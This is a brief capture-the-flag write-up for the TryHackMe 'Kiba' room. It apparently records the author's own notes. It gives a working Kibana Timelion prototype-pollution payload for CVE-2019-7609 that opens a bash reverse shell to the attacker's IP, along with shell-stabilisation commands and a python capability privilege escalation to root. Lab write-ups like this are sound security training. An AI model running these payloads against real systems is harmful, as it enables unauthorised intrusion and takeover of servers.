# Kiba 🧭
Names | Details
--------|-----
Source |tryhackme
Level     | easy
Os |linux

**Notes :davad**


[


## Gaining Access 😉

- rustscan -a 10.10.100.210  found a open port 5601 
- kibana 6.5.4 is runing on it
- found a rce on that service CVE-2019-7609
- http://10.10.165.134:5601/app/timelion/
-``.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.9.4.123/1234 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')``

- exec http://10.10.100.210:5601/app/canvas#/
- got a reverse shell 




## Maintaining Access 🥷
 ### maintaining shell 
- ``script /dev/null/ -c bash
- ``python3 -c 'import pty;pty.spawn("/bin/bash")'
- ``stty rows 38 columns 116
- ``stty raw -echo; fg             <      >     reset
- .``/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'``



## Important commands 🔥
- ``getcap -r /``

## Post Exploitation ✴️
- User flag : /home/kiba/user.txt
- Root flag : /root/root.txt
## Tips 💡
- rustscan is faster than nmap 
- 


--------------------------------
**By Whois~TCP ** 🤓🖥️






